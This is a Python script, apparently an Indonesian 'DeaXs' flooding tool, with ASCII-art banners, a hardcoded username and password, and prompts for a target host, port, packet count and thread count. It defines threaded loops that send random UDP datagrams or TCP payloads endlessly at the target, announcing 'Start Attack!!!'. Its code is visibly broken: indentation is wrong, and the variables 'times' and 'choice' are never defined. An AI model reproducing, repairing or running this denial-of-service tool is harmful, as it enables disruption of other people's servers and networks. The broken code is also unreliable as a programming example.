import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")

print("""\033[91m
██████╗░███████╗░█████╗░██╗░░██╗░██████╗
██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝██╔════╝
██║░░██║█████╗░░███████║░╚███╔╝░╚█████╗░
██║░░██║██╔══╝░░██╔══██║░██╔██╗\033[92m╚═══██╗
██████╔╝███████╗██║░░██║██╔╝╚█ip█╗██████╔╝
╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░""")

username = str(input("\033[94m[DeaXs] \033[93mUsername:"))
password = str(input("\033[94m[DeaXs] \033[93mPassword:"))
if password == "GorXsganteng" and username == "GorXsganteng":
    print ("Telah Masuk Sebagai GorXs")
    time.sleep(3)

else:
    print ("Passwordnya Salah Hadeh.")
    time.sleep(999)

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.5)


nicknm = "GorXs"

mt = """\033[96mUnder \033[0;93mmaintance"""

os.system("clear")

print("""\033[94m
███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█
████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█
███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█
████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█
███▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██
█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██
█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███
██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███
███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████
███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████
████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████
█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████
██████████▓▓▓█▓▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬▓███████
███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████
██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████
███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████
""")
ip = str(input(" \033[91mHost/Ip:"))
port = int(input(" \033[92mPort:"))
time = int(input(" \033[93mPackets:"))
threads = int(input(" \033[94mThreads:"))

os.system("clear")

         def run(): 
         data = random._urandom(1000) 
         i = random.choice(("[+]","[-]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
                         addr = (str(ip),int(port)) 
                         for x in range(times): 
                                 s.sendto(data,addr) 
                         print(i +" Start Attack!!! ") 
                 except: 
                         print("[!] Gagal Cukk!!!") 
  
 def run2(): 
         data = random._urandom(16) 
         i = random.choice(("[*]","[!]","[#]")) 
         while True: 
                 try: 
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
                         s.connect((ip,port)) 
                         s.send(data) 
                         for x in range(times): 
                                 s.send(data) 
                         print(i +" Start Attack!!! ") 
                 except: 
                         s.close() 
                         print("[*] Gagal Cukk!!!") 
              
 for y in range(threads): 
         if choice == 'y': 
                 th = threading.Thread(target = run) 
                 th.start() 
         else: 
                 th = threading.Thread(target = run2) 
                 th.start()